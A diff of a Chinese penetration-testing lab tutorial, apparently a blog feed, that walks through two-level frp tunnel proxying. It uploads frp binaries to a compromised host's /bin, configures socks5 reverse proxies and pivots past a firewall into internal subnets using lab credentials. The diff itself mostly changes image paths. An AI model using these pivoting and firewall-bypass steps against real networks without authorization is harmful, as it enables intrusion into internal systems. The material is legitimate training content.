@@ -10,7 +10,7 @@
       <link>https://yuexuan521.github.io/og-default.png</link>
     </image>
     <generator>Hugo -- 0.160.1</generator>
-    <language>en-us</language>
+    <language>zh-cn</language>
     <copyright>See this site&amp;rsquo;s source code here, licensed under GPLv3 ·</copyright>
     <lastBuildDate>Sat, 11 Apr 2026 12:17:10 +0000</lastBuildDate>
     <atom:link href="https://yuexuan521.github.io/zh/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.xml" rel="self" type="application/rss+xml" />
@@ -30,40 +30,37 @@
 <li>交换机/路由：交换机 4台；路由器 1台；</li>
 <li>软件：frp；SocksCap64</li>
 </ul>
-<h2 id="实验拓扑">【实验拓扑】</h2><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500546.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500546.png" 
-             alt="网络拓扑图：攻击机 Kali 67.220.91.30 与 Windows 67.220.91.68，经 NGFW 防火墙分出 DMZ 172.16.10.0/24、办公区 10.0.18.0/24、服务器区 10.0.20.0/24" 
-              
-             loading="lazy"
-        />
+<h2 id="实验拓扑">【实验拓扑】</h2><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500546.png">
+        <img src="/images/blog/20260417115500546.png"
+             alt="网络拓扑图：攻击机 Kali 67.220.91.30 与 Windows 67.220.91.68，经 NGFW 防火墙分出 DMZ 172.16.10.0/24、办公区 10.0.18.0/24、服务器区 10.0.20.0/24"
+             
+             loading="eager" decoding="async" fetchpriority="high" width="1052" height="712"/>
     </a>
-</div></p>
+</div>
+</p>
 <h2 id="实验预期">【实验预期】</h2><p>1.配置一级隧道代理
 2.配置二级隧道代理，代理进入内网并绕过防火墙限制</p>
 <h2 id="实验步骤">【实验步骤】</h2><h3 id="1一级隧道代理">1.一级隧道代理</h3><h4 id="1登录攻击机2-windows">（1）登录攻击机2-Windows</h4><p>单击上方菜单栏中的【环境申请】按钮启动实验拓扑，选择拓扑图中左下方的【攻击机2-Windows】，按右键，在弹出的菜单中选择【控制台】，登录【攻击机2-Windows】界面。</p>
-<p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500548.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500548.png" 
-             alt="同一张网络拓扑图，用于说明二级隧道的路径" 
-              
-             loading="lazy"
-        />
+<p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500548.png">
+        <img src="/images/blog/20260417115500548.png"
+             alt="同一张网络拓扑图，用于说明二级隧道的路径"
+             
+             loading="lazy" decoding="async" width="1052" height="712"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>依次双击打开桌面【工具】→【frp】文件夹。</p>
-<p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500549.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500549.png" 
-             alt="frp 目录下的文件：frpc.exe、frps.exe、frpc.toml、LICENSE 等" 
-              
-             loading="lazy"
-        />
+<p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500549.png">
+        <img src="/images/blog/20260417115500549.png"
+             alt="frp 目录下的文件：frpc.exe、frps.exe、frpc.toml、LICENSE 等"
+             
+             loading="lazy" decoding="async" width="955" height="388"/>
     </a>
-</div></p>
+</div>
+</p>
 <h4 id="2配置攻击机frp服务端">（2）配置攻击机frp服务端</h4><p>双击打开【frps.ini】配置文件，输入以下参数内容并保存，编辑【frps.ini】配置文件配置本地服务端口7000。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -75,27 +72,25 @@
 </span></span><span class="line"><span class="cl">server_port = 7000
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500550.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500550.png" 
-             alt="选中 frps.ini，记事本内容为 ［common］ server_port=7000（红框）" 
-              
-             loading="lazy"
-        />
+</div><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500550.png">
+        <img src="/images/blog/20260417115500550.png"
+             alt="选中 frps.ini，记事本内容为 ［common］ server_port=7000（红框）"
+             
+             loading="lazy" decoding="async" width="844" height="497"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>在【frp】此文件夹空白处，右键弹出菜单，单击选择【在此处打开命令提示符】。</p>
-<p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500551.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500551.png" 
-             alt="右键菜单里选择「在此处打开命令提示符」" 
-              
-             loading="lazy"
-        />
+<p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500551.png">
+        <img src="/images/blog/20260417115500551.png"
+             alt="右键菜单里选择「在此处打开命令提示符」"
+             
+             loading="lazy" decoding="async" width="325" height="364"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>在命令提示符窗口中，输入以下命令，开启本地服务端代理监听7000端口。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -105,16 +100,15 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">frps -c frps.ini
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500552.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500552.png" 
-             alt="执行 frps -c frps.ini，提示 frps started successfully" 
-              
-             loading="lazy"
-        />
+</div><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500552.png">
+        <img src="/images/blog/20260417115500552.png"
+             alt="执行 frps -c frps.ini，提示 frps started successfully"
+             
+             loading="lazy" decoding="async" width="1133" height="147"/>
     </a>
-</div></p>
+</div>
+</p>
 <h4 id="2上传frp并配置一级隧道frp的客户端">（2）上传frp并配置一级隧道frp的客户端</h4><p>再次在【frp】此文件夹空白处，新建命令提示符终端，输入以下命令并按回车输入密码【Com.1234】，使用scp命令上传【frps】和【frpc】linux版的服务端和客户端文件至202.1.10.57的/bin目录。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -124,16 +118,15 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">scp frps frpc test@202.1.10.57:/bin
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500553.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500553.png" 
-             alt="scp 把 frps 与 frpc 上传到 test@202.1.10.57 的 /bin 目录，两个文件均 100%" 
-              
-             loading="lazy"
-        />
+</div><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500553.png">
+        <img src="/images/blog/20260417115500553.png"
+             alt="scp 把 frps 与 frpc 上传到 test@202.1.10.57 的 /bin 目录，两个文件均 100%"
+             
+             loading="lazy" decoding="async" width="1091" height="135"/>
     </a>
-</div></p>
+</div>
+</p>
 <blockquote>
 <p>注：由第六单元的6.2子任务，利用SUID方式提权添加test用户为root权限，密码为Com.1234。</p>
 </blockquote>
@@ -146,16 +139,15 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh test@202.1.10.57
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500554.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500554.png" 
-             alt="ssh 登录 202.1.10.57，显示上次登录来源 67.220.91.30，已进入 root@centos7" 
-              
-             loading="lazy"
-        />
+</div><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500554.png">
+        <img src="/images/blog/20260417115500554.png"
+             alt="ssh 登录 202.1.10.57，显示上次登录来源 67.220.91.30，已进入 root@centos7"
+             
+             loading="lazy" decoding="async" width="630" height="104"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>输入以下命令并按下回车，使用chmod命令给予【frps】和【frpc】两个文件执行权限。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -167,16 +159,15 @@
 </span></span><span class="line"><span class="cl">chmod +x frpc
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500555.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500555.png" 
-             alt="chmod &#43;x 给 /bin/frpc 与 /bin/frps 加执行权限" 
-              
-             loading="lazy"
-        />
+</div><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500555.png">
+        <img src="/images/blog/20260417115500555.png"
+             alt="chmod &#43;x 给 /bin/frpc 与 /bin/frps 加执行权限"
+             
+             loading="lazy" decoding="async" width="364" height="65"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>输入以下命令并按下回车键，使用vim命令创建并编辑tmp根目录下的frpc.ini客户端配置文件。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -186,16 +177,15 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vim /tmp/frpc.ini
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500556.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500556.png" 
-             alt="vim 编辑 /tmp/frpc.ini" 
-              
-             loading="lazy"
-        />
+</div><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500556.png">
+        <img src="/images/blog/20260417115500556.png"
+             alt="vim 编辑 /tmp/frpc.ini"
+             
+             loading="lazy" decoding="async" width="335" height="26"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>对frpc.ini文件进行编辑添加客户端的参数，按【i】键启用编辑模式，并输入以下配置参数，分别配置攻击机的IP与监听端口、配置本地socks5代理端口1080、配置给由本地10080端口转发至本地10088端口，再由本地10088端口转发到攻击机。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -231,27 +221,25 @@
 </span></span><span class="line"><span class="cl">remote_port = 10088
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500557.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500557.png" 
-             alt="frpc.ini 内容：［common］ 指向 67.220.91.68:7000，［socks5-1］ 用 remote_port 1080，［socks5-33］ 映射本地 10080 到 10088" 
-              
-             loading="lazy"
-        />
+</div><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500557.png">
+        <img src="/images/blog/20260417115500557.png"
+             alt="frpc.ini 内容：［common］ 指向 67.220.91.68:7000，［socks5-1］ 用 remote_port 1080，［socks5-33］ 映射本地 10080 到 10088"
+             
+             loading="lazy" decoding="async" width="291" height="320"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>编辑完成后，按下【Esc】键，退出编辑模式，输入 【:wq】 命令并按下回车键，保存并退出文件编辑模式。</p>
-<p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500558.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500558.png" 
-             alt="vim 底部执行 :wq 保存退出" 
-              
-             loading="lazy"
-        />
+<p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500558.png">
+        <img src="/images/blog/20260417115500558.png"
+             alt="vim 底部执行 :wq 保存退出"
+             
+             loading="lazy" decoding="async" width="66" height="28"/>
     </a>
-</div></p>
+</div>
+</p>
 <h4 id="3配置网站门户2的frp客户端">（3）配置网站门户2的frp客户端</h4><p>输入以下命令并按下回车，执行frpc客户端与服务端连接。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -261,27 +249,25 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">frpc -c /tmp/frpc.ini
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500559.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500559.png" 
-             alt="运行 frpc -c /tmp/frpc.ini，输出 login to server success 与 start proxy success" 
-              
-             loading="lazy"
-        />
+</div><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500559.png">
+        <img src="/images/blog/20260417115500559.png"
+             alt="运行 frpc -c /tmp/frpc.ini，输出 login to server success 与 start proxy success"
+             
+             loading="lazy" decoding="async" width="1120" height="171"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>frps服务端开始响应，连接成功。</p>
-<p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500560.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500560.png" 
-             alt="frps 服务端日志：客户端 202.1.10.57 登录，并为 socks5-33、socks5-1 建立 tcp 代理" 
-              
-             loading="lazy"
-        />
+<p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500560.png">
+        <img src="/images/blog/20260417115500560.png"
+             alt="frps 服务端日志：客户端 202.1.10.57 登录，并为 socks5-33、socks5-1 建立 tcp 代理"
+             
+             loading="lazy" decoding="async" width="1130" height="255"/>
     </a>
-</div></p>
+</div>
+</p>
 <h3 id="2二级隧道代理">2.二级隧道代理</h3><h4 id="1配置网站门户2的frp二级隧道服务端">（1）配置网站门户2的frp二级隧道服务端</h4><p>桌面新建命令提示符终端，并远程连接目标服务器的SSH202.1.10.57服务器，输入以下命令并按下回车键，使用vim命令创建并编辑tmp根目录下的frps.ini客户端配置文件。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -291,16 +277,15 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vim /tmp/frps.ini
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500561.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500561.png" 
-             alt="vim 编辑 /tmp/frps.ini" 
-              
-             loading="lazy"
-        />
+</div><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500561.png">
+        <img src="/images/blog/20260417115500561.png"
+             alt="vim 编辑 /tmp/frps.ini"
+             
+             loading="lazy" decoding="async" width="370" height="32"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>对frpc.ini文件进行编辑添加客户端的参数，按【i】键启用编辑模式，并输入以下配置参数，配置本地服务端口7000。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -312,38 +297,35 @@
 </span></span><span class="line"><span class="cl">bind_port = 7000
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500562.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500562.png" 
-             alt="frps.ini 内容为 ［common］ bind_port = 7000" 
-              
-             loading="lazy"
-        />
+</div><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500562.png">
+        <img src="/images/blog/20260417115500562.png"
+             alt="frps.ini 内容为 ［common］ bind_port = 7000"
+             
+             loading="lazy" decoding="async" width="203" height="101"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>编辑完成后，按下【Esc】键，退出编辑模式，输入 【:wq】 命令并按下回车键，保存并退出文件编辑模式。</p>
-<p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500558.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500558.png" 
-             alt="vim 底部执行 :wq 保存退出" 
-              
-             loading="lazy"
-        />
+<p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500558.png">
+        <img src="/images/blog/20260417115500558.png"
+             alt="vim 底部执行 :wq 保存退出"
+             
+             loading="lazy" decoding="async" width="66" height="28"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>输入ifconfig命令并按回车，得知门户网站2内网IP地址为【172.16.10.183】。</p>
-<p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500563.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500563.png" 
-             alt="ifconfig 输出，红框标出 eth0 的内网地址 172.16.10.183" 
-              
-             loading="lazy"
-        />
+<p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500563.png">
+        <img src="/images/blog/20260417115500563.png"
+             alt="ifconfig 输出，红框标出 eth0 的内网地址 172.16.10.183"
+             
+             loading="lazy" decoding="async" width="722" height="838"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>输入以下命令并按下回车，在网站门户2中开启frp服务端程序。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -353,16 +335,15 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">frps -c /tmp/frps.ini
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500564.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500564.png" 
-             alt="在 172.16.10.183 上运行 frps -c /tmp/frps.ini，提示 frps started successfully" 
-              
-             loading="lazy"
-        />
+</div><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500564.png">
+        <img src="/images/blog/20260417115500564.png"
+             alt="在 172.16.10.183 上运行 frps -c /tmp/frps.ini，提示 frps started successfully"
+             
+             loading="lazy" decoding="async" width="1118" height="151"/>
     </a>
-</div></p>
+</div>
+</p>
 <h4 id="2配置网站门户1的frp二级隧道客户端">（2）配置网站门户1的frp二级隧道客户端</h4><p>双击打开在【工具】文件夹下的【frpc.ini】配置文件，输入以下参数内容并保存，编辑【frpc.ini】，分别配置反向连接门户网站2的服务端端口7000、使用socks5代理门户网站2的客户端端口10080。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -386,49 +367,45 @@
 </span></span><span class="line"><span class="cl">remote_port = 10080  
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500565.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500565.png" 
-             alt="frpc.ini 改为指向 172.16.10.183:7000，［socks5-2］ 的 remote_port 为 10080" 
-              
-             loading="lazy"
-        />
+</div><p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500565.png">
+        <img src="/images/blog/20260417115500565.png"
+             alt="frpc.ini 改为指向 172.16.10.183:7000，［socks5-2］ 的 remote_port 为 10080"
+             
+             loading="lazy" decoding="async" width="458" height="267"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>双击打开桌面上的远程桌面，单击【连接】按钮，连接目标202.1.10.34服务器。</p>
-<p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500566.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500566.png" 
-             alt="远程桌面连接窗口，计算机填 202.1.10.34，用户名 test" 
-              
-             loading="lazy"
-        />
+<p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500566.png">
+        <img src="/images/blog/20260417115500566.png"
+             alt="远程桌面连接窗口，计算机填 202.1.10.34，用户名 test"
+             
+             loading="lazy" decoding="async" width="550" height="370"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>输入【test】的用户，密码为【Com.1234】。</p>
-<p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500568.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500568.png" 
-             alt="Windows 安全中心要求输入 test 的凭据，密码已填写" 
-              
-             loading="lazy"
-        />
+<p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500568.png">
+        <img src="/images/blog/20260417115500568.png"
+             alt="Windows 安全中心要求输入 test 的凭据，密码已填写"
+             
+             loading="lazy" decoding="async" width="539" height="526"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>等待连接。</p>
-<p>
-<div class="post-img-view">
-    <a data-fancybox="gallery" href="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500569.png">
-        <img src="https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500569.png" 
-             alt="正在连接到 202.1.10.34，进度条显示正在加密远程连接" 
-              
-             loading="lazy"
-        />
+<p><div class="post-img-view">
+    <a data-fancybox="gallery" href="/images/blog/20260417115500569.png">
+        <img src="/images/blog/20260417115500569.png"
+             alt="正在连接到 202.1.10.34，进度条显示正在加密远程连接"
+             
+             loading="lazy" decoding="async" width="567" height="201"/>
     </a>
-</div></p>
+</div>
+</p>
 <p>进入远程桌面窗口，关闭服务器管理器窗口，复制【工具】文件夹的【frpc.exe】和【frpc.ini】两个文件到目标远程的桌面。</p>
 <p>在桌面shift+右键弹出菜单，选择【在此处打开命令提示符】。</p>
 <p>输入命令并按回车，在网站门户1中开启frp客户端程序。</p>
